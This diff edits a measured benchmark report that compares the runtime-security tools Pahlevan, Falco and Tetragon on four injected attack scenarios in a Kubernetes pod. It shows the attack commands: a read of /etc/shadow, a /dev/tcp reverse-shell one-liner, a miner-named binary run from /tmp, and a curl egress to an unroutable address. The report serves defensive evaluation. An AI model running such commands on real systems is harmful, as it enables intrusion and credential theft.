@@ -1,4 +1,4 @@
-# Pahlevan vs Falco vs Tetragon — measured runtime-security benchmark
+# Pahlevan vs Falco vs Tetragon - measured runtime-security benchmark
 
 > **These numbers are real and measured**, produced by `test/benchmark/run.sh`
 > inside the kernel-isolated VM (`hack/vm/`) on the date below. Where something
@@ -37,14 +37,14 @@ next was installed.
 Attacks are injected into the target pod with `kubectl exec` (simulating an
 attacker running commands inside the compromised workload):
 
-1. **01 sensitive-file-read** — `cat /etc/shadow`
-2. **02 reverse-shell** — `bash -c 'sh -i >/dev/tcp/127.0.0.1/4444 0>&1'`
-3. **03 crypto-miner-exec** — `cp /bin/sleep /tmp/xmrig && /tmp/xmrig`
-4. **04 unexpected-egress** — `curl http://198.51.100.10/` (TEST-NET-2, unroutable)
+1. **01 sensitive-file-read** - `cat /etc/shadow`
+2. **02 reverse-shell** - `bash -c 'sh -i >/dev/tcp/127.0.0.1/4444 0>&1'`
+3. **03 crypto-miner-exec** - `cp /bin/sleep /tmp/xmrig && /tmp/xmrig`
+4. **04 unexpected-egress** - `curl http://198.51.100.10/` (TEST-NET-2, unroutable)
 
 ## Results matrix
 
-Legend — **Detected**: the tool produced a signal for the action. **Blocked**:
+Legend - **Detected**: the tool produced a signal for the action. **Blocked**:
 the action was *prevented* (not merely alerted).
 
 | Scenario | Pahlevan Detected | Pahlevan Blocked | Falco Detected | Falco Blocked | Tetragon Detected | Tetragon Blocked |
@@ -54,24 +54,24 @@ the action was *prevented* (not merely alerted).
 | 03 exec from `/tmp` | Yes (file_open) | **Yes** (EPERM) | **Yes** (Critical: not in base image) | No | Yes (exec telemetry, incl `/tmp/xmrig`) | No by default |
 | 04 egress | No² | **Yes**³ (EPERM on `curl` exec) | **No** (default rules) | No | Yes (exec telemetry, incl dest URL) | No by default |
 
-¹ Tetragon **can** block with a hand-written `TracingPolicy` — demonstrated
+¹ Tetragon **can** block with a hand-written `TracingPolicy` - demonstrated
 separately below (with a serious caveat).
 ² Pahlevan's network eBPF programs are **not attached at runtime** (see below), so
 egress itself is not observed.
 ³ The egress *attack* is blocked only because it requires exec'ing `curl`, an
-unlearned binary — **not** by inspecting the network connection. Egress initiated
+unlearned binary - **not** by inspecting the network connection. Egress initiated
 by an already-allowed process would **not** be blocked.
 
 ### How the block manifests (Pahlevan)
 
 Pahlevan's only wired enforcement is the **LSM `file_open` hook**: in enforce
 mode it returns `-EPERM` for any file path not in the container's auto-learned
-allow-list, keyed per cgroup. This was confirmed directly in the kernel — the
+allow-list, keyed per cgroup. This was confirmed directly in the kernel - the
 `file_mode` BPF map showed the nginx cgroup (`id 14274`) set to `1` (enforce),
 and `file_allowed` held 5476 learned entries.
 
 In practice this blocks **all four** scenarios, because each requires launching a
-new process, and even the `runc exec` setup opens an unlearned path — every attack
+new process, and even the `runc exec` setup opens an unlearned path - every attack
 failed with:
 
 ```
@@ -118,16 +118,16 @@ Caveats:
 
 | Tool | Observation |
 |------|-------------|
-| **Pahlevan** | The nginx workload kept serving **HTTP 200** before, during, and after enforcement (its served path was learned) — **no workload false positive**. However, **all `kubectl exec` is blocked** once enforcing (an operational cost), and static paths not touched during the 30 s learning window would also be blocked (only `/` was exercised). |
-| **Falco** | No alerts on the benign nginx traffic. But it **flagged host `systemd-executor` reading `/etc/shadow` and `/etc/pam.d/*` as "non-trusted"** — host-level noise unrelated to the workload. |
-| **Tetragon** | Default mode is observe-only → no enforcement false positives, but emits **high-volume telemetry** for every exec node-wide (k3s, runc, containerd-shim included). The enforcement test produced a catastrophic false positive — see below. |
+| **Pahlevan** | The nginx workload kept serving **HTTP 200** before, during, and after enforcement (its served path was learned) - **no workload false positive**. However, **all `kubectl exec` is blocked** once enforcing (an operational cost), and static paths not touched during the 30 s learning window would also be blocked (only `/` was exercised). |
+| **Falco** | No alerts on the benign nginx traffic. But it **flagged host `systemd-executor` reading `/etc/shadow` and `/etc/pam.d/*` as "non-trusted"** - host-level noise unrelated to the workload. |
+| **Tetragon** | Default mode is observe-only → no enforcement false positives, but emits **high-volume telemetry** for every exec node-wide (k3s, runc, containerd-shim included). The enforcement test produced a catastrophic false positive - see below. |
 
 ## Tetragon enforcement (with a hand-written TracingPolicy)
 
 To test whether Tetragon *can* block (it does not by default), a `TracingPolicy`
 was applied that `Sigkill`s on `security_file_permission` for `/etc/shadow`:
 
-- **It blocked scenario 01** — `cat /etc/shadow` was killed (`rc=137`, SIGKILL).
+- **It blocked scenario 01** - `cat /etc/shadow` was killed (`rc=137`, SIGKILL).
 - **But the same (node-wide, un-scoped) policy caused an outage**: it also killed
   unrelated processes (`cat /etc/hostname`, `rc=137`) and then froze **all new
   process creation** on the node (every `exec` was SIGKILLed on file access),
@@ -143,15 +143,15 @@ auto-learned allow-list (no hand-written rules) and to Falco's alert-only design
 
 The committed agent on this branch **did not run as-is**; it crash-looped. Two
 one-line workarounds were applied **to a throwaway build copy in scratch space
-only** (the repo tree was not modified — verify with `git status`) to obtain a
+only** (the repo tree was not modified - verify with `git status`) to obtain a
 running agent and measure real enforcement:
 
-1. **Double `AttachPrograms()`** — `cmd/pahlevan-agent/main.go` calls
+1. **Double `AttachPrograms()`** - `cmd/pahlevan-agent/main.go` calls
    `AttachPrograms()` directly *and* `Manager.Start()` calls it again
    (`pkg/ebpf/manager.go`), re-registering the `sys_enter` raw tracepoint →
    `EEXIST ("file exists")` → fatal crashloop. Workaround: drop the redundant
    direct call.
-2. **Duplicate controller name** — `AttackSurfaceAnalyzerReconciler` and
+2. **Duplicate controller name** - `AttackSurfaceAnalyzerReconciler` and
    `PahlevanPolicyReconciler` both `For(&PahlevanPolicy{})`, so both default to the
    controller-runtime name `pahlevanpolicy` → "controller names must be unique" →
    fatal. Workaround: give one an explicit `.Named(...)`.
@@ -165,10 +165,10 @@ Additional operational findings (no code change needed, but they shaped the run)
    fired.
 4. **Enforcement signals are logs + kernel state only.** `pahlevan_*` Prometheus
    metrics are **not exposed** on `:8080` (the promauto default registry is not
-   the one controller-runtime serves — confirmed by `curl`), and
+   the one controller-runtime serves - confirmed by `curl`), and
    `.status.enforcementStatus.blocked*` counters stay `0`. Detection/blocks were
    verified via the kernel `file_mode`/`file_allowed` BPF maps, the observed
-   `EPERM`, and the control-pod comparison — not via metrics or CRD status.
+   `EPERM`, and the control-pod comparison - not via metrics or CRD status.
 5. **On agent restart** the attach race (finding 1's chokepoint) recurs and the
    agent can fall back into CrashLoopBackOff; when the agent is down, enforcement
    stops (BPF links detach).
@@ -176,7 +176,7 @@ Additional operational findings (no code change needed, but they shaped the run)
 ## What could NOT be measured / limitations
 
 - **Pahlevan network & syscall enforcement**: not exercised because they are not
-  wired at runtime — the network XDP/TC/LSM programs are **not attached** and no
+  wired at runtime - the network XDP/TC/LSM programs are **not attached** and no
   syscall-deny path exists (only file-open denial is real). So scenario 04 is
   blocked incidentally (via the `curl` binary's file open), and reverse-shell /
   egress *network* primitives are neither observed nor blocked.
@@ -193,6 +193,6 @@ Additional operational findings (no code change needed, but they shaped the run)
 With vendor defaults, **Falco** alerts on 2/4 (never blocks), **Tetragon** gives
 exec telemetry on all 4 (never blocks by default; can block but a naive policy
 caused a node outage), and **Pahlevan** blocks all 4 from an **auto-learned**
-allow-list — but only via **file-open** denial (its network/syscall enforcement
+allow-list - but only via **file-open** denial (its network/syscall enforcement
 is not wired), it is the heaviest on memory, and the committed build required two
 one-line fixes to run at all.
